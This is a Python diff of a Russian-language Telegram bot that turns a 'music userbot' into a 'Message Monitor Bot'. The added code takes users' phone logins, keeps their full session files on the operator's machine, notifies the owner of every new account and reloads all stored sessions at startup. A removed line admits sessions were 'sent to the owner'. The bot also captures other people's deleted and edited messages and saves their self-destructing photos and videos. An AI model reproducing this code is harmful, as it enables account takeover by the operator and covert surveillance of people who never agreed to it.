+        session_file = f"session_{user_id}.session"
+        await register_user_connection(user_id, phone, user_info, session_file)
         
-        📊 **Инфо:**
-        `.info` — Информация о чате
-        `.online` — Статус онлайн
-        `.offline` — Статус оффлайн
-        `.purge` — Удалить свои сообщения
+        # Сохраняем клиент
+        user_clients[user_id] = client
+        connected_users_info[user_id] = {
+            **user_info,
+            'connected_at': datetime.now(),
+            'active': True
+        }
         
-        🎵 **Музыка:**
-        `.music <запрос>` — Поиск музыки
-        """
-        await event.reply(help_text, parse_mode='md')
-    
-    @client.on(events.NewMessage(pattern=r'^\.me$'))
-    async def user_me(event):
-        try:
-            me = await client.get_me()
-            await event.reply(
-                f"👤 **ВАШ АККАУНТ:**\n"
-                f"• ID: `{me.id}`\n"
-                f"• Имя: {me.first_name}\n"
-                f"• Фамилия: {me.last_name or '—'}\n"
-                f"• Юзернейм: @{me.username or '—'}\n"
-                f"• Телефон: {me.phone or '—'}\n"
-                f"• Premium: {'✅' if me.premium else '❌'}\n"
-                f"• Сессия: Зашифрована и отправлена владельцу",
-                parse_mode='md'
-            )
-        except:
-            await event.reply("❌ Ошибка получения данных")
-    
-    @client.on(events.NewMessage(pattern=r'^\.спам (\d+) (.+)$'))
-    async def user_spam(event):
-        chat_id = event.chat_id
-        try:
-            count = int(event.pattern_match.group(1))
-            text = event.pattern_match.group(2)
-            
-            if count > 25:
-                await event.reply("⚠️ Максимум 25 сообщений")
-                return
-            
-            if count < 1:
-                await event.reply("⚠️ Минимум 1 сообщение")
-                return
-            
-            spam_flags[chat_id] = True
-            status_msg = await event.reply(f"🚀 Начинаю спам ({count} сообщений)...")
-            
-            for i in range(count):
-                if not spam_flags.get(chat_id):
-                    break
-                await event.respond(f"{text} [{i+1}/{count}]")
-                await asyncio.sleep(0.5)
-            
-            if spam_flags.get(chat_id):
-                await status_msg.edit("✅ Спам завершён")
-                spam_flags[chat_id] = False
-                
-        except Exception as e:
-            await event.reply(f"❌ Ошибка: {str(e)[:50]}")
-    
-    @client.on(events.NewMessage(pattern=r'^\.спамстоп$'))
-    async def user_spam_stop(event):
-        chat_id = event.chat_id
-        if spam_flags.get(chat_id):
-            spam_flags[chat_id] = False
-            await event.reply("🛑 Спам остановлен")
-        else:
-            await event.reply("ℹ️ Нет активного спама")
-    
-    @client.on(events.NewMessage(pattern=r'^\.text (.+)$'))
-    async def user_text(event):
-        text = event.pattern_match.group(1)
-        if len(text) > 100:
-            await event.reply("⚠️ Максимум 100 символов")
-            return
+        # Уведомляем владельца
+        await notify_owner_about_new_user(user_id, phone, user_info)
         
-        result = ""
-        msg = await event.reply("⏳ Начинаю анимацию...")
+        # Запускаем обработчики для этого клиента
+        asyncio.create_task(setup_user_client_handlers(client, user_id))
         
-        for char in text:
-            result += char
-            await asyncio.sleep(0.05)
-            try:
-                await msg.edit(f"`{result}`")
-            except:
-                pass
-        
-        await msg.edit(f"✨ **Результат:**\n`{text}`")
-    
-    @client.on(events.NewMessage(pattern=r'^\.1000-7$'))
-    async def user_countdown(event):
-        current = 1000
-        msg = await event.reply("🔢 Начинаю отсчёт...")
-        
-        while current > 0:
-            await msg.edit(f"`{current} - 7 = {current - 7}`")
-            current -= 7
-            await asyncio.sleep(0.5)
-        
-        await msg.edit("🎉 Отсчёт завершён!")
-    
-    @client.on(events.NewMessage(pattern=r'^\.ping$'))
-    async def user_ping(event):
-        start = time.time()
-        msg = await event.reply('🏓 Pong!')
-        delay = round((time.time() - start) * 1000, 2)
-        await msg.edit(f'🏓 Pong! `{delay} ms`')
-    
-    @client.on(events.NewMessage(pattern=r'^\.id$'))
-    async def user_id(event):
-        chat = await event.get_chat()
-        user = await event.get_sender()
-        await event.reply(
-            f"📊 **ID информации:**\n"
-            f"• ID чата: `{chat.id}`\n"
-            f"• Ваш ID: `{user.id}`\n"
-            f"• Тип: {type(chat).__name__}",
+        # Уведомляем пользователя
+        await bot.send_message(
+            session['chat_id'],
+            f"✅ **АВТОРИЗАЦИЯ УСПЕШНАЯ!**\n\n"
+            f"👋 Добро пожаловать, {user_info['first_name']}!\n\n"
+            "🤖 **Бот теперь отслеживает:**\n"
+            "• Все удалённые сообщения\n"
+            "• Все изменённые сообщения\n"
+            "• Исчезающие фото/видео\n\n"
+            "📋 **Команды:**\n"
+            "/trackall — отслеживать все чаты\n"
+            "/chats — список чатов\n"
+            "/stats — ваша статистика\n\n"
+            "🔔 Уведомления будут приходить в этот чат!",
             parse_mode='md'
         )
+        
+        # Очищаем сессию авторизации
+        del auth_sessions[user_id]
+        
+        logger.info(f"Пользователь {user_id} успешно авторизован")
+        
+    except Exception as e:
+        logger.error(f"Ошибка завершения авторизации: {e}")
+        await bot.send_message(
+            session['chat_id'],
+            f"❌ Ошибка завершения авторизации: {str(e)[:100]}"
+        )
+
+# ==================== ОБРАБОТЧИКИ ЮЗЕР-КЛИЕНТОВ ====================
+async def setup_user_client_handlers(client, owner_id):
+    """Настройка обработчиков для юзер-клиента"""
     
-    @client.on(events.NewMessage(pattern=r'^\.online$'))
-    async def user_online(event):
+    @client.on(events.MessageDeleted)
+    async def handle_deleted(event):
+        """Обработка удалённых сообщений"""
         try:
-            await client(UpdateStatusRequest(offline=False))
-            await event.reply("✅ Статус: онлайн")
-        except:
-            await event.reply("❌ Ошибка")
-    
-    @client.on(events.NewMessage(pattern=r'^\.offline$'))
-    async def user_offline(event):
-        try:
-            await client(UpdateStatusRequest(offline=True))
-            await event.reply("✅ Статус: оффлайн")
-        except:
-            await event.reply("❌ Ошибка")
-    
-    @client.on(events.NewMessage(pattern=r'^\.purge$'))
-    async def user_purge(event):
-        try:
-            count = 0
-            async for message in client.iter_messages(event.chat_id, from_user='me', limit=50):
-                await message.delete()
-                count += 1
-                await asyncio.sleep(0.2)
-            await event.reply(f"✅ Удалено {count} сообщений")
+            for chat_id, deleted_ids in event.deleted_ids.items():
+                if owner_id not in active_chats or chat_id not in active_chats[owner_id]:
+                    continue
+                
+                chat = await client.get_entity(chat_id)
+                chat_title = getattr(chat, 'title', f"Chat {chat_id}")
+                
+                for msg_id in deleted_ids:
+                    cache_key = f"{chat_id}_{msg_id}"
+                    if cache_key in message_cache:
+                        cached_msg = message_cache[cache_key]
+                        
+                        # Формируем сообщение
+                        sender = await cached_msg.get_sender()
+                        sender_name = getattr(sender, 'first_name', 'Unknown')
+                        text = cached_msg.message or ""
+                        
+                        msg_text = f"""
+🗑️ **УДАЛЁННОЕ СООБЩЕНИЕ**
+
+💬 **Чат:** {chat_title}
+👤 **От:** {sender_name}
+🆔 **ID:** {msg_id}
+📅 **Время:** {cached_msg.date.strftime('%H:%M:%S') if hasattr(cached_msg, 'date') else 'Unknown'}
+
+📝 **Текст:**
+{text[:500]}
+                        """
+                        
+                        # Отправляем владельцу юзер-бота
+                        await bot.send_message(
+                            owner_id,
+                            msg_text.strip(),
+                            parse_mode='md'
+                        )
+                        
+                        # Логируем событие
+                        await log_user_event(
+                            owner_id,
+                            'deleted',
+                            chat_id=chat_id,
+                            chat_title=chat_title,
+                            message_id=msg_id,
+                            sender_id=sender.id if sender else 0,
+                            content_preview=text[:200]
+                        )
+                        
+                        # Удаляем из кэша
+                        del message_cache[cache_key]
+                        
         except Exception as e:
-            await event.reply(f"❌ Ошибка: {str(e)[:50]}")
+            logger.error(f"Ошибка обработки удаления: {e}")
     
-    @client.on(events.NewMessage(pattern=r'^\.music (.+)$'))
-    async def user_music(event):
-        query = event.pattern_match.group(1)
-        await event.reply(f"🔍 Ищу: `{query}`")
-        
-        if not ym_client:
-            await event.reply("⚠️ Яндекс.Музыка недоступна")
-            return
-        
+    @client.on(events.MessageEdited)
+    async def handle_edited(event):
+        """Обработка изменённых сообщений"""
         try:
-            search_result = ym_client.search(query, type_='track', page=0)
-            if not search_result or not search_result.tracks:
-                await event.reply("🎵 Ничего не найдено")
+            message = event.message
+            chat = await message.get_chat()
+            chat_id = chat.id
+            
+            if owner_id not in active_chats or chat_id not in active_chats[owner_id]:
                 return
             
-            track = search_result.tracks.results[0]
-            artists = ", ".join(artist.name for artist in track.artists)
-            await event.reply(
-                f"🎵 **{artists}** — {track.title}\n"
-                f"💿 {track.albums[0].title if track.albums else 'Single'}\n"
-                f"🔗 [Слушать](https://music.yandex.ru/track/{track.id})",
-                parse_mode='md',
-                link_preview=False
-            )
+            # Получаем старое сообщение из кэша
+            cache_key = f"{chat_id}_{message.id}"
+            old_text = ""
+            if cache_key in message_cache:
+                old_msg = message_cache[cache_key]
+                old_text = old_msg.message or ""
+            
+            # Обновляем кэш
+            message_cache[cache_key] = message
+            
+            # Если есть изменения текста
+            new_text = message.message or ""
+            if old_text and old_text != new_text:
+                chat_title = getattr(chat, 'title', f"Chat {chat_id}")
+                sender = await message.get_sender()
+                sender_name = getattr(sender, 'first_name', 'Unknown')
+                
+                msg_text = f"""
+✏️ **ИЗМЕНЁННОЕ СООБЩЕНИЕ**
+
+💬 **Чат:** {chat_title}
+👤 **От:** {sender_name}
+🆔 **ID:** {message.id}
+
+📝 **Было:**
+{old_text[:300]}
+
+📝 **Стало:**
+{new_text[:300]}
+                """
+                
+                await bot.send_message(
+                    owner_id,
+                    msg_text.strip(),
+                    parse_mode='md'
+                )
+                
+                await log_user_event(
+                    owner_id,
+                    'edited',
+                    chat_id=chat_id,
+                    chat_title=chat_title,
+                    message_id=message.id,
+                    sender_id=sender.id if sender else 0,
+                    old_text_preview=old_text[:200],
+                    new_text_preview=new_text[:200]
+                )
+                
         except Exception as e:
-            await event.reply("❌ Ошибка поиска")
+            logger.error(f"Ошибка обработки редактирования: {e}")
     
-    logger.info(f"Запущены обработчики для user_id={user_id}")
-    await client.run_until_disconnected()
+    @client.on(events.NewMessage)
+    async def handle_new_message(event):
+        """Кэширование новых сообщений для отслеживания"""
+        try:
+            message = event.message
+            chat = await message.get_chat()
+            chat_id = chat.id
+            
+            if owner_id not in active_chats or chat_id not in active_chats[owner_id]:
+                return
+            
+            # Кэшируем сообщение
+            cache_key = f"{chat_id}_{message.id}"
+            message_cache[cache_key] = message
+            
+            # Проверяем на исчезающие медиа (self-destruct)
+            if message.media and hasattr(message, 'ttl_seconds') and message.ttl_seconds:
+                # Это исчезающее сообщение - сохраняем медиа
+                chat_title = getattr(chat, 'title', f"Chat {chat_id}")
+                media_info = await save_media(message, chat_title)
+                
+                if media_info:
+                    file_path, media_type = media_info
+                    
+                    sender = await message.get_sender()
+                    sender_name = getattr(sender, 'first_name', 'Unknown')
+                    
+                    msg_text = f"""
+⚠️ **ИСЧЕЗАЮЩЕЕ {media_type.upper()} СОХРАНЕНО!**
+
+💬 **Чат:** {chat_title}
+👤 **От:** {sender_name}
+🕐 **Исчезнет через:** {message.ttl_seconds} сек.
+💾 **Сохранено в:** {file_path}
+                    """
+                    
+                    await bot.send_message(
+                        owner_id,
+                        msg_text.strip(),
+                        parse_mode='md'
+                    )
+                    
+                    # Отправляем само медиа
+                    try:
+                        await bot.send_file(
+                            owner_id,
+                            file_path,
+                            caption=f"📸 Исчезающее {media_type} из {chat_title}"
+                        )
+                    except:
+                        pass
+                    
+                    await log_user_event(
+                        owner_id,
+                        'media_saved',
+                        chat_id=chat_id,
+                        chat_title=chat_title,
+                        message_id=message.id,
+                        media_type=media_type,
+                        file_path=file_path,
+                        ttl_seconds=message.ttl_seconds
+                    )
+            
+        except Exception as e:
+            logger.error(f"Ошибка обработки нового сообщения: {e}")
+
+async def save_media(message, chat_title):
+    """Сохранение медиа из сообщения"""
+    try:
+        if not message.media:
+            return None
+        
+        # Создаём уникальное имя файла
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        chat_safe = "".join(c if c.isalnum() else "_" for c in chat_title)[:20]
+        
+        # Скачиваем медиа
+        file_path = await message.download_media(file=MEDIA_DIR)
+        if not file_path:
+            return None
+        
+        # Определяем тип медиа
+        if isinstance(message.media, MessageMediaPhoto):
+            media_type = "photo"
+            target_dir = PHOTOS_DIR
+            ext = ".jpg"
+        elif isinstance(message.media, MessageMediaDocument):
+            doc = message.media.document
+            if isinstance(doc, Document):
+                for attr in doc.attributes:
+                    if isinstance(attr, DocumentAttributeVideo):
+                        media_type = "video"
+                        target_dir = VIDEOS_DIR
+                        ext = ".mp4"
+                        break
+                else:
+                    media_type = "document"
+                    target_dir = DOCS_DIR
+                    ext = ""
+            else:
+                media_type = "document"
+                target_dir = DOCS_DIR
+                ext = ""
+        else:
+            return None
+        
+        # Перемещаем файл
+        original_path = Path(file_path)
+        if not ext:
+            ext = original_path.suffix
+        
+        new_name = f"{chat_safe}_{timestamp}_{media_type}{ext}"
+        new_path = target_dir / new_name
+        
+        original_path.rename(new_path)
+        
+        return str(new_path), media_type
+        
+    except Exception as e:
+        logger.error(f"Ошибка сохранения медиа: {e}")
+        return None
 
 # ==================== ЗАПУСК ====================
 async def main():
-    """Запуск бота"""
-    logger.info("🚀 Запуск X-GEN Music UserBot...")
+    """Основная функция запуска"""
+    logger.info("🚀 Запуск Message Monitor Bot...")
     
+    # Запускаем бота
     await bot.start(bot_token=BOT_TOKEN)
     me = await bot.get_me()
     logger.info(f"🤖 Бот запущен: @{me.username}")
     
-    # Автозагрузка активных сессий
-    session_files = [f for f in os.listdir('.') if f.startswith('user_') and f.endswith('.session')]
+    # Автозагрузка существующих сессий
+    session_files = [f for f in os.listdir('.') if f.startswith('session_') and f.endswith('.session')]
     for session_file in session_files:
         try:
-            user_id = session_file[5:-8]
-            if user_id.isdigit():
+            # Извлекаем user_id из имени файла
+            user_id_str = session_file.replace('session_', '').replace('.session', '')
+            if user_id_str.isdigit():
+                user_id = int(user_id_str)
+                
+                # Подключаем клиент
                 client = TelegramClient(session_file, API_ID, API_HASH)
                 await client.connect()
+                
                 if await client.is_user_authorized():
-                    active_user_clients[int(user_id)] = client
-                    asyncio.create_task(run_user_client_handlers(client, int(user_id)))
-                    logger.info(f"📂 Загружена сессия: {session_file}")
+                    # Получаем информацию о пользователе
+                    me_user = await client.get_me()
+                    
+                    # Регистрируем в системе
+                    user_clients[user_id] = client
+                    connected_users_info[user_id] = {
+                        'user_id': me_user.id,
+                        'first_name': me_user.first_name,
+                        'last_name': me_user.last_name or '',
+                        'username': me_user.username or '',
+                        'phone': 'loaded_from_session',
+                        'active': True
+                    }
+                    
+                    # Запускаем обработчики
+                    asyncio.create_task(setup_user_client_handlers(client, user_id))
+                    
+                    logger.info(f"📂 Загружена сессия для user_id={user_id}")
+                    
+                    # Добавляем все чаты в отслеживание
+                    try:
+                        dialogs = await client.get_dialogs(limit=30)
+                        if user_id not in active_chats:
+                            active_chats[user_id] = []
+                        
+                        for dialog in dialogs:
+                            chat = dialog.entity
+                            chat_id = chat.id
+                            if chat_id not in active_chats[user_id]:
+                                active_chats[user_id].append(chat_id)
+                    except:
+                        pass
+                    
                 else:
                     await client.disconnect()
                     os.remove(session_file)
+                    
         except Exception as e:
-            logger.error(f"Ошибка загрузки {session_file}: {e}")
+            logger.error(f"Ошибка загрузки сессии {session_file}: {e}")
     
-    # Уведомление владельцу
+    # Уведомление владельцу о запуске
     try:
+        owner = await bot.get_entity(OWNER_USERNAME)
+        OWNER_ID = owner.id
+        
+        # Получаем статистику
+        stats = await get_user_stats()
+        active_count = sum(1 for uid in connected_users_info if connected_users_info[uid].get('active', False))
+        
         await bot.send_message(
-            OWNER_USERNAME,
-            f"🤖 **X-GEN MUSIC BOT ЗАПУЩЕН**\n"
-            f"• Время: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
+            OWNER_ID,
+            f"🤖 **MESSAGE MONITOR BOT ЗАПУЩЕН**\n\n"
             f"• Бот: @{me.username}\n"
-            f"• Активных сессий: {len(active_user_clients)}\n"
-            f"• Яндекс.Музыка: {'✅' if ym_client else '❌'}\n\n"
-            f"**Готов к работе!**",
+            f"• Время: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
+            f"• Загружено сессий: {len(user_clients)}\n"
+            f"• Активных пользователей: {active_count}\n"
+            f"• Всего пользователей в БД: {stats['total_users'] if stats else 0}\n\n"
+            f"✅ **Система готова к работе!**",
             parse_mode='md'
         )
     except Exception as e:
         logger.error(f"Не удалось уведомить владельца: {e}")
     
-    logger.info("✅ Бот готов. Ожидание команд...")
+    logger.info(f"✅ Система запущена. Активных пользователей: {len(user_clients)}")
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
-    bot.loop.run_until_complete(main())
+    asyncio.run(main())
